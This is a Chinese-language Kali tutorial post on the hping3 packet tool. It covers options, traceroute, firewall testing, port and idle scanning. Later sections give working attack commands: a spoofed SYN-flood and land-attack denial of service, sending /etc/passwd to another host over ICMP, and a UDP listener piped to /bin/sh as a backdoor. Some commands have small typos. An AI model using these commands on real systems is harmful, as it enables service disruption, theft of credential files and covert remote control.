---
title: hping3
categories: Information Gathering
tags: [hping3,information gathering,kali linux,spoofing,recon]
date: 2017-04-23 06:52:00
---
0x00 hping3介绍
-------------
hping是面向命令行的用于生成和解析TCP/IP协议数据包汇编/分析的开源工具。作者是Salvatore Sanfilippo，界面灵感来自ping（8）unix命令，目前最新版是hping3，它支持TCP，UDP，ICMP和RAW-IP协议，具有跟踪路由模式，能够在覆盖的信道之间发送文件以及许多其他功能，支持使用tcl脚本自动化地调用其API。hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。


<!--more-->


虽然hping以前主要用作安全工具，但它可以在许多方面被不太关心安全性的人员用于测试网络和主机，您可以使用hping的一小部分内容：
```plain
 - 防火墙测试
 - 高级端口扫描
 - 网络测试，使用不同的协议，TOS，分片
 - 手动路径MTU发现
 - 在所有支持的协议下，高级traceroute
 - 远程操作系统指纹
 - 远程正常运行时间猜测
 - TCP/IP协议栈审计
 - hping也可以用于学习TCP/IP的学生
```
<!--more-->

工具来源：http://www.hping.org/
[hping3主页][1] | [Kali hping3仓库][2]

 - 作者：Salvatore Sanfilippo
 - 证书：GPLv2

0x01 hping3功能
----------------

```plain
root@kali:~# hping3 -h
用法: hping3 主机 [options]
  -h  --help      显示帮助
  -v  --version   显示版本
  -c  --count     数据包计数
  -i  --interval  等待 (uX即X微秒, 例如： -i u1000)
      --fast      等同 -i u10000 (每秒10个包)
      --faster    等同 -i u1000 (每秒100个包)
      --flood     尽最快发送数据包，不显示回复。
  -n  --numeric   数字输出
  -q  --quiet     静默模式
  -I  --interface 接口名 (默认路由接口)
  -V  --verbose   详细模式
  -D  --debug     调试信息
  -z  --bind      绑定ctrl+z到ttl(默认为目的端口)
  -Z  --unbind    取消绑定ctrl+z键
      --beep      对于接收到的每个匹配数据包蜂鸣声提示
模式
  默认模式     TCP
  -0  --rawip      原始IP模式
  -1  --icmp       ICMP模式
  -2  --udp        UDP模式
  -8  --scan       SCAN模式
                   例子: hping --scan 1-30,70-90 -S www.target.host
  -9  --listen     listen模式
IP
  -a  --spoof      伪造源地址
  --rand-dest      随机目的地址模式。详细使用man命令
  --rand-source    随机来源地址模式。详细使用man命令
  -t  --ttl        ttl (默认64)
  -N  --id         id (默认随机)
  -W  --winid      使用win* id字节顺序
  -r  --rel        相对id字段(估计主机流量)
  -f  --frag       拆分数据包更多的frag
  -x  --morefrag   设置更多的分段标志
  -y  --dontfrag   设置不分段标志
  -g  --fragoff    设置分段偏移
  -m  --mtu        设置虚拟最大传输单元
  -o  --tos        服务类型（默认为0x00），尝试--tos帮助
  -G  --rroute     包含RECORD_ROUTE选项并显示路由缓冲区
  --lsrr           松散源路由并记录路由
  --ssrr           严格源路由并记录路由
  -H  --ipproto    设置IP协议字段，仅在RAW IP模式下使用
ICMP
  -C  --icmptype   icmp类型(默认echo请求)
  -K  --icmpcode   icmp代号(默认0)
      --force-icmp 发送所有icmp类型(默认仅发送支持的类型)
      --icmp-gw    设置ICMP重定向网关地址(默认0.0.0.0)
      --icmp-ts    等同 --icmp --icmptype 13 (ICMP 时间戳)
      --icmp-addr  等同 --icmp --icmptype 17 (ICMP 地址子网掩码)
      --icmp-help  显示其他icmp选项帮助
UDP/TCP
  -s  --baseport   基源端口(默认随机)
  -p  --destport   [+][+]<port> 目的端口(默认0) ctrl+z inc/dec
  -k  --keep       保持源端口
  -w  --win        windows发送字节(默认64)
  -O  --tcpoff     设置伪造tcp数据偏移量(取代tcp地址长度除4)
  -Q  --seqnum     仅显示tcp序列号
  -b  --badcksum   (尝试)发送具有错误IP校验和数据包                    
                   许多系统将修复发送数据包的IP校验和                    
                   所以你会得到错误UDP/TCP校验和。
  -M  --setseq     设置TCP序列号
  -L  --setack     设置TCP确认
  -F  --fin        设置FIN标志
  -S  --syn        设置SYN标志
  -R  --rst        设置RST标志
  -P  --push       设置PUSH标志
  -A  --ack        设置ACK标志
  -U  --urg        设置URG标志
  -X  --xmas       设置X未使用的标志(0x40)
  -Y  --ymas       设置Y未使用的标志(0x80)
  --tcpexitcode    使用last tcp-> th_flags作为退出码
  --tcp-mss        启用具有给定值的TCP MSS选项
  --tcp-timestamp  启用TCP时间戳选项来猜测HZ/uptime
通用
  -d  --data       数据大小(默认0)
  -E  --file       文件数据
  -e  --sign       添加“签名”
  -j  --dump       转储为十六进制数据包
  -J  --print      转储为可打印字符
  -B  --safe       启用“安全”协议
  -u  --end        告诉你什么时候--file达到EOF并防止倒回
  -T  --traceroute traceroute模式(等同使用 --bind 且--ttl 1)
  --tr-stop        在traceroute模式下收到第一个不是ICMP时退出
  --tr-keep-ttl    保持源TTL固定，仅用于监视一跳
  --tr-no-rtt      不要在跟踪路由模式下计算/显示RTT信息 ARS包描述（新增功能，不稳定）
  --apd-send       发送APD描述数据包(参见docs / APD.txt)
```

0x02 hping3用法示例
---------
对于目标（www.example.com），使用跟踪路由模式（-traceroute），在ICMP模式（-1）中详细显示verbose（-V）：
```plain
root@kali:~# hping3 --traceroute -V -1 www.example.com
using eth0, addr: 192.168.1.15, MTU: 1500
HPING www.example.com (eth0 93.184.216.119): icmp mode set, 28 headers + 0 data bytes
hop=1 TTL 0 during transit from ip=192.168.1.1 name=UNKNOWN
hop=1 hoprtt=0.3 ms
hop=2 TTL 0 during transit from ip=192.168.0.1 name=UNKNOWN
hop=2 hoprtt=3.3 ms
```

0x03 hping3典型功能
-----------

**防火墙测试**
使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。请参考：http://0daysecurity.com/articles/hping3_examples.html 
测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。
例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。 

    hping3 -S -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10 

端口扫描 
Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。
以下示例可用于探测目标机的80端口是否开放： 

    hping3 -I eth0 -S 192.168.10.1 -p 80 

其中-I eth0指定使用eth0端口，-S指定TCP包的标志位SYN，-p 80指定探测的目的端口。 
hping3支持非常丰富的端口探测方式，nmap拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，
所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。
当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。 

**Idle扫描** 
Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，
目前Idle扫描在Nmap中也有实现。 该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），
攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），
此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，
获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。 

**拒绝服务攻击** 

使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。

    hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000 

其他攻击如smurf、teardrop、land attack等也很容易构建出来。 

**文件传输** 
Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。
实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。
在接收端开启服务： 

    hping3 192.168.1.159--listen signature --safe --icmp 

监听ICMP包中的签名，根据签名解析出文件内容。 
在发送端使用签名打包的ICMP包发送文件： 

    hping3 192.168.1.108--icmp ?d 100 --sign signature --file /etc/passwd 

将/etc/passwd密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。 

**木马功能** 
如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。 
示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。 
在木马启动端： 

    hping3 192.168.10.66--listen signature --safe --udp -p 53 | /bin/sh 

在远程控制端： 

    echo ls >test.cmd hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd 

将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。 
当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。



  [1]: http://www.hping.org/
  [2]: http://git.kali.org/gitweb/?p=packages/hping3.git;a=summary